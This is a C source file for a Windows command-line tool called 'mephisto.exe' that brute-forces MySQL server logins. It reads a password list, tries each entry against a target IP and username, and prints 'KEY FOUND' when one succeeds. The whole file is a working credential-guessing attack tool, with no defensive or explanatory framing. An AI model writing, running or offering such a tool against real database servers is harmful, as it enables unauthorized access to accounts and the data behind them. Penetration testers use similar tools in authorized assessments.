#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql/mysql.h>
#include <windows.h>

// Function to set color
void SetColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

// Function to attempt MySQL connection
int TryPassword(const char *ip, const char *username, const char *password) {
    MYSQL *conn;
    conn = mysql_init(NULL);

    if (conn == NULL) {
        SetColor(12); // Red for errors
        printf("MYSQL initialization failed!\n");
        return 0;
    }

    // Construct connection string
    if (mysql_real_connect(conn, ip, username, password, NULL, 0, NULL, 0) != NULL) {
        mysql_close(conn);
        return 1; // Key found
    } else {
        mysql_close(conn);
        return 0; // Key not found
    }
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: mephisto.exe -l <username> -P <passwordlist> mysql://<ip>\n");
        return 1;
    }

    char *username = NULL;
    char *passwordlist = NULL;
    char *ip = NULL;

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0) {
            username = argv[++i];
        } else if (strcmp(argv[i], "-P") == 0) {
            passwordlist = argv[++i];
        } else if (strncmp(argv[i], "mysql://", 8) == 0) {
            ip = argv[i] + 8; // Remove "mysql://"
        }
    }

    if (username == NULL || passwordlist == NULL || ip == NULL) {
        printf("Invalid arguments.\n");
        return 1;
    }

    FILE *file = fopen(passwordlist, "r");
    if (file == NULL) {
        SetColor(12);
        printf("Error opening password list file.\n");
        return 1;
    }

    char password[256];
    while (fgets(password, sizeof(password), file) != NULL) {
        // Remove newline from password
        password[strcspn(password, "\n")] = 0;

        SetColor(10); // Green for trying a password
        printf("TRYING PASSWORD: %s\n", password);

        if (TryPassword(ip, username, password)) {
            SetColor(2); // Green for found password
            printf("KEY FOUND: %s\n", password);
            fclose(file);
            return 0;
        } else {
            SetColor(12); // Red for not found password
            printf("KEY NOT FOUND: %s\n", password);
        }
    }

    fclose(file);
    SetColor(15); // Reset color
    printf("Brute-force attempt finished.\n");

    return 0;
}
